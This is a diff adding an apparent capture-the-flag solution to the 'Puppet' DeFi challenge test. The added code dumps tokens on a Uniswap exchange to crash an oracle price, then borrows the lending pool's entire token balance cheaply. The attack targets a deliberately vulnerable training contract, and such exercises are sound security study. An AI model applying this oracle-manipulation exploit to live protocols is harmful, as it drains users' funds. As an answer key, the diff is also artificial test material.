@@ -115,6 +115,25 @@ describe("[Challenge] Puppet", function () {
 
     it("Exploit", async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // sell DVT in uniswap first, pump ETH/DVT price
+        await this.token
+            .connect(attacker)
+            .approve(this.uniswapExchange.address, ethers.constants.MaxUint256)
+
+        // min_eth CANNOT BE ZERO
+        // Not using ATTACKER_INITIAL_TOKEN_BALANCE because the final token balance should be gt than POOL_INITIAL_TOKEN_BALANCE
+        await this.uniswapExchange
+            .connect(attacker)
+            .tokenToEthSwapInput(ethers.utils.parseEther("900"), 1, ethers.constants.MaxUint256)
+
+        // try to borrow all tokens in the lending pool
+        const ethRequired = await this.lendingPool.calculateDepositRequired(
+            POOL_INITIAL_TOKEN_BALANCE,
+        )
+        await this.lendingPool
+            .connect(attacker)
+            .borrow(POOL_INITIAL_TOKEN_BALANCE, { value: ethRequired })
     })
 
     after(async function () {
